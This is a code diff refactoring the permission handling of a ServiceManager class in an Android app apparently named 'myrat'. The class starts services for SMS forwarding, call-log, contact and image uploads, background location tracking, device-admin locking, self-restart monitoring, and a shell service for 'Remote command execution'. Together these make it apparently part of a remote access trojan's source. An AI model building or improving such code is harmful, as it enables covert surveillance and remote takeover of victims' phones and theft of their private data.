@@ -7,63 +7,43 @@ import android.content.Intent
 import android.os.Build
 import android.provider.Settings
 import com.myrat.app.utils.Logger
-import pub.devrel.easypermissions.EasyPermissions
+import com.myrat.app.utils.PermissionUtils
 
 class ServiceManager(private val context: Context) {
     
     data class ServiceInfo(
         val serviceClass: Class<*>,
-        val requiredPermissions: List<String>,
+        val requiredPermissions: Array<String>,
         val requiredSpecialPermissions: List<String> = emptyList(),
         val description: String,
-        val priority: Int = 1 // 1 = highest priority, 5 = lowest
+        val priority: Int = 1
     )
     
     private val serviceDefinitions = listOf(
-        // PRIORITY 1 - CRITICAL SERVICES (Start first)
         ServiceInfo(
             serviceClass = SmsService::class.java,
-            requiredPermissions = listOf(
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.SEND_SMS,
-                Manifest.permission.READ_PHONE_STATE
-            ),
+            requiredPermissions = PermissionUtils.SMS_PERMISSIONS,
             description = "SMS handling and forwarding",
             priority = 1
         ),
         
         ServiceInfo(
             serviceClass = CallService::class.java,
-            requiredPermissions = listOf(
-                Manifest.permission.CALL_PHONE,
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.READ_PHONE_NUMBERS
-            ),
+            requiredPermissions = PermissionUtils.PHONE_PERMISSIONS,
             description = "Phone call management",
             priority = 1
         ),
         
         ServiceInfo(
             serviceClass = LocationService::class.java,
-            requiredPermissions = listOf(
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            ).let { permissions ->
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    permissions + Manifest.permission.ACCESS_BACKGROUND_LOCATION
-                } else {
-                    permissions
-                }
-            },
+            requiredPermissions = PermissionUtils.LOCATION_PERMISSIONS + PermissionUtils.BACKGROUND_LOCATION_PERMISSIONS,
             description = "Location tracking and monitoring",
             priority = 1
         ),
         
-        // PRIORITY 2 - IMPORTANT SERVICES
         ServiceInfo(
             serviceClass = LockService::class.java,
-            requiredPermissions = emptyList(),
+            requiredPermissions = PermissionUtils.BIOMETRIC_PERMISSIONS,
             requiredSpecialPermissions = listOf("device_admin", "battery_optimization"),
             description = "Device lock and security management",
             priority = 2
@@ -71,7 +51,7 @@ class ServiceManager(private val context: Context) {
         
         ServiceInfo(
             serviceClass = CallLogUploadService::class.java,
-            requiredPermissions = listOf(
+            requiredPermissions = arrayOf(
                 Manifest.permission.READ_CALL_LOG,
                 Manifest.permission.READ_PHONE_STATE
             ),
@@ -81,35 +61,28 @@ class ServiceManager(private val context: Context) {
         
         ServiceInfo(
             serviceClass = ContactUploadService::class.java,
-            requiredPermissions = listOf(
-                Manifest.permission.READ_CONTACTS
-            ),
+            requiredPermissions = arrayOf(Manifest.permission.READ_CONTACTS),
             description = "Contact synchronization",
             priority = 2
         ),
         
-        // PRIORITY 3 - UTILITY SERVICES
         ServiceInfo(
             serviceClass = ImageUploadService::class.java,
-            requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                listOf(Manifest.permission.READ_MEDIA_IMAGES)
-            } else {
-                listOf(Manifest.permission.READ_EXTERNAL_STORAGE)
-            },
+            requiredPermissions = PermissionUtils.STORAGE_PERMISSIONS,
             description = "Image upload and management",
             priority = 3
         ),
         
         ServiceInfo(
             serviceClass = ShellService::class.java,
-            requiredPermissions = emptyList(),
+            requiredPermissions = emptyArray(),
             description = "Remote command execution",
             priority = 3
         ),
         
         ServiceInfo(
             serviceClass = SmsConsentService::class.java,
-            requiredPermissions = listOf(
+            requiredPermissions = arrayOf(
                 Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.READ_SMS
             ),
@@ -117,10 +90,9 @@ class ServiceManager(private val context: Context) {
             priority = 3
         ),
         
-        // PRIORITY 4 - MONITORING SERVICES (Start last)
         ServiceInfo(
             serviceClass = ServiceMonitorService::class.java,
-            requiredPermissions = emptyList(),
+            requiredPermissions = emptyArray(),
             description = "Service monitoring and restart",
             priority = 4
         )
@@ -149,14 +121,12 @@ class ServiceManager(private val context: Context) {
     }
     
     private fun canStartService(serviceInfo: ServiceInfo): Boolean {
-        // Check runtime permissions
         val hasRuntimePermissions = if (serviceInfo.requiredPermissions.isNotEmpty()) {
-            EasyPermissions.hasPermissions(context, *serviceInfo.requiredPermissions.toTypedArray())
+            PermissionUtils.hasPermissions(context, *serviceInfo.requiredPermissions)
         } else {
             true
         }
         
-        // Check special permissions
         val hasSpecialPermissions = serviceInfo.requiredSpecialPermissions.all { specialPermission ->
             when (specialPermission) {
                 "device_admin" -> isDeviceAdminEnabled()
@@ -173,14 +143,12 @@ class ServiceManager(private val context: Context) {
     private fun startService(serviceInfo: ServiceInfo): Boolean {
         val serviceName = serviceInfo.serviceClass.simpleName
         
-        // Check if service is already running
         if (isServiceRunning(serviceInfo.serviceClass)) {
             Logger.log("$serviceName is already running")
             startedServices.add(serviceName)
             return false
         }
         
-        // Check if we already started this service
         if (startedServices.contains(serviceName)) {
             Logger.log("$serviceName already started in this session")
             return false
@@ -206,14 +174,12 @@ class ServiceManager(private val context: Context) {
     private fun getMissingPermissions(serviceInfo: ServiceInfo): List<String> {
         val missing = mutableListOf<String>()
         
-        // Check runtime permissions
         serviceInfo.requiredPermissions.forEach { permission ->
-            if (!EasyPermissions.hasPermissions(context, permission)) {
+            if (!PermissionUtils.hasPermissions(context, permission)) {
                 missing.add(permission)
             }
         }
         
-        // Check special permissions
         serviceInfo.requiredSpecialPermissions.forEach { specialPermission ->
             when (specialPermission) {
                 "device_admin" -> if (!isDeviceAdminEnabled()) missing.add("Device Admin")
@@ -266,7 +232,6 @@ class ServiceManager(private val context: Context) {
         }
     }
     
-    // Helper methods for checking special permissions
     private fun isDeviceAdminEnabled(): Boolean {
         return try {
             val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
